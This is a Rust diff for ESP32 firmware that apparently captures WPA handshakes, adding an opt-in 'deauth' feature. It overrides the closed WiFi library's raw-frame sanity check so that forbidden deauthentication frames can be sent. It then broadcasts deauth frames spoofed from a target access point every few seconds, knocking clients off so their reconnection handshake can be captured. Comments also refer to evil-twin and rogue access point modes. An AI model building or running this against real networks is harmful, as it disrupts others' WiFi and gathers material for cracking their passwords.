@@ -203,6 +203,21 @@ const INJECT_REPLAY: u32 = 1000; // replay counter for our injected msg1 (> the 
 /// frame hexdump). The one-shot "capture on ch" / "rogue AP up" lines stay regardless.
 const HS_DIAG: bool = false;
 
+/// DEAUTH UNLOCK (opt-in `deauth` feature). The closed IDF v5.5 WiFi blob's
+/// `ieee80211_raw_frame_sanity_check` (in `libnet80211.a` / `ieee80211_output.o`, called
+/// by `esp_wifi_80211_tx`) rejects deauth/disassoc raw-TX subtypes. Providing our own
+/// strong definition that returns 0 (OK) makes the blob accept them — the standard ESP32
+/// approach (ESP32 Marauder, Bruce, the Arduino Evil-Cardputer). It's a strong symbol in
+/// the same object as `esp_wifi_80211_tx`, so build.rs adds `-Wl,--allow-multiple-definition`
+/// under this feature to make our (first-seen) definition win the link. The args are the
+/// blob's `(type, arg, len)`; we ignore them. Default builds omit this (deauth stays
+/// rejected, surfaced honestly). Ineffective against PMF/802.11w networks.
+#[cfg(feature = "deauth")]
+#[no_mangle]
+pub extern "C" fn ieee80211_raw_frame_sanity_check(_typ: i32, _arg: i32, _len: i32) -> i32 {
+    0
+}
+
 fn handshake_cb(pkt: esp_radio::wifi::sniffer::PromiscuousPkt<'_>) {
     let d = pkt.data;
     SNIFF_TOTAL.fetch_add(1, Ordering::Relaxed);
@@ -804,6 +819,19 @@ impl Radio {
             }
             delay.delay_millis(200);
             ticks += 1;
+            // DEAUTH-ASSIST (opt-in `deauth` feature, PASSIVE capture only): every ~3 s
+            // broadcast a deauth from the target BSSID to kick its clients off, so they
+            // re-associate and we catch the fresh 4-way instead of waiting (up to 2 min)
+            // for a natural one. Skipped in evil-twin/inject mode (clients come to us).
+            // Without the override (default build) send_raw_frame returns Err → no-op.
+            #[cfg(feature = "deauth")]
+            if inject.is_none() && ticks % 15 == 0 {
+                let mut db = [0u8; wifi_frames::DEAUTH_LEN];
+                let dn = wifi_frames::deauth(&mut db, wifi_frames::BROADCAST, bssid, 7);
+                if let Some(i) = self.wifi_ifaces.as_mut() {
+                    let _ = i.sniffer.send_raw_frame(true, &db[..dn], true);
+                }
+            }
             // poll progress via the atomics only — must NOT form a reference into HS
             // while the cb may be writing it on the WiFi task (that would alias).
             // evil-twin supplies its own ANonce, so a captured msg2 alone is enough;
